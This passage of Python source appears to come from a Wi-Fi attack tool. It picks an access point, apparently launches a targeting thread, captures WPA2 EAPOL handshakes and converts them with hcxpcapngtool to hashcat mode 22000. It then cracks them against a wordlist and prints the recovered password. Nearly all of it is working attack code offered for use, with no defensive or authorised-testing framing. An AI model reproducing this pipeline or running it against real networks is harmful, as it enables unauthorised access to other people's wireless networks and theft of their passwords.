            """Converts .pcap to .16800 using hcxpcapngtool, and validates the result."""


            def validate_hash_file(path):
                """Validates that the .16800 hash file starts with a proper WPA hash line."""
                try:
                    with open(path, "r") as f:
                        line = f.readline().strip()
                        return line.startswith("WPA*02*")
                except Exception as e:
                    console.print(f"[bold red][-] Hash validation error: [bold yellow]{e}")
                    return False


            try:
                result = subprocess.run([
                    "hcxpcapngtool",
                    "-o", str(output_path),
                    str(handshake_path)
                ], check=True, capture_output=True, text=True)

                if validate_hash_file(output_path):
                    console.print(f"[bold green][+] Conversion complete | .pcap → .16800")
                    return output_path
                else:
                    console.print(f"[bold red][-] Conversion failed: invalid or empty hash file.")
                    return None

            except subprocess.CalledProcessError as e:
                console.print("[bold red][-] hcxpcapngtool crashed during conversion.")
                console.print(e.stderr)
                return None


        def hash_cracker(hash_path, wordlist_path):
            """This will crack created hash"""

            try:
                subprocess.run([
                    "hashcat",
                    "-m", "22000",              # WPA2 hash mode
                    str(hash_path),
                    str(wordlist_path),
                    "--force",                  # skip warnings
                    "--status", "--status-timer", "10"
                ], check=True)

                console.print("[bold green][+] Hashcat finished.")

            except subprocess.CalledProcessError as e:
                console.print("[bold red][-] Hashcat failed.")
                console.print(e.stderr)
        

        def show_cracked(hash_path):
            """This will show cracked handshake"""

            try:
                result = subprocess.run([
                    "hashcat",
                    "-m", "22000",
                    str(hash_path),
                    "--show"
                ], capture_output=True, text=True)

                cracked = result.stdout.strip()

                if cracked:
                    password = cracked.split(":")[-1]
                    console.print(f"[+] Password cracked: {password}")
                    return password
                else:
                    console.print("[-] No password found.")
                    return None

            except Exception as e:
                console.print("[-] Failed to show cracked result.")
                console.print(e)
                return None


        
        
        def parser(pkt, handshake=handshake):
            """This will parse that hoe"""


            # ADDR1 == DST 
            # ADDR2 AND ADDR3 == SRC


            if not cls.sniff or not handshake: return

            if pkt.haslayer(EAPOL) or pkt.haslayer(Dot11ProbeResp): 

                
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False   # CLIENT
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False   # ACCESS POINT
                

                if cls.target[1] == addr2 or cls.target[1] == addr1:


                    if not cls.handshake_tracker["client"]:

                        cls.handshake_tracker["client"] = addr2
                        cls.handshake_tracker["ap"]     = addr1
                    

                    if not addr1 == cls.handshake_tracker["client"] and not addr2 == cls.handshake_tracker["ap"]: return

                    print("hi")
                    if pkt.haslayer(Dot11ProbeResp): 
                        cls.probe = True
                        cls.handshake_tracker["frames"].append(pkt)
                        console.print(f"[bold green][+]Probe Captured --> {pkt}")


                    sd = "Client"
                    cls.handshake_tracker["frames"].append(pkt)
                    cls.handshake_tracker["count"] += 1
                    
                    if addr1: console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {sd} --> {addr1} --> {pkt}")
                    #if addr2: console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")

                    

                    USER_HOME = Path(os.getenv("SUDO_USER") and f"/home/{os.getenv('SUDO_USER')}") or Path.home()
                    path = USER_HOME / "Documents" / "nsm_tools" / "netcracker" / "hashes"; path.mkdir(exist_ok=True, parents=True)


                    if cls.handshake_tracker["count"] >= 3 and cls.probe:

                        cls.sniff = False
                        file, output_path, wordlist_path = file_enumerator(path=path, client=addr2, ap=addr1)
                        wrpcap(str(file), cls.handshake_tracker["frames"]); console.print("[bold green][+] EAPOL Full Handshake pushed")
                        hash_path = hash_converter(handshake_path=file, output_path=output_path)
                        hash_cracker(hash_path=hash_path, wordlist_path=wordlist_path)
                        show_cracked(hash_path=hash_path)

                        cls.handshake_tracker = {
                            "client": None, 
                            "ap": None,
                            "count": 0,
                            "frames": []
                        } 
                        cls.probe = False
                    



        sniffer()
    


    @classmethod
    def main(cls):
        """This will run class wide logic"""

        
        cls.target = []
        cls.ssids = []
        cls.mac_ifo = []
        cls.sniff = True
        cls.probe = False
        cls.handshake_tracker = {
            "client": None,
            "ap": None,
            "count": 0,
            "frames": []
        }



        try:

            iface = Frame_Snatcher.get_interface()

            Frame_Snatcher.welcome_ui(iface=iface)
            Background_Threads.change_iface_mode(iface=iface, mode=2)
            Background_Threads.channel_hopper(verbose=False)


            Hash_Snatcher._sniff_for_ap(iface=iface)
            ssid, bssid, channel  = Hash_Snatcher._choose_ap()
            Background_Threads.channel_hopper(set_channel=channel)

            threading.Thread(target=Hash_Snatcher._target_attacker, args=(iface, bssid), daemon=True).start()

            Hash_Snatcher._sniff_for_hashes(iface=iface, timeout=60*240)
        
        
        except KeyboardInterrupt as e: cls.sniff = False; console.print(f"[bold red]Keyboard Error:[yellow] {e}")


        except Exception as e: console.print(f"[bold red]Exception Error:[yellow] {e}")
        

        finally: console.input("\n\n[bold green]Press Enter to Return: ")

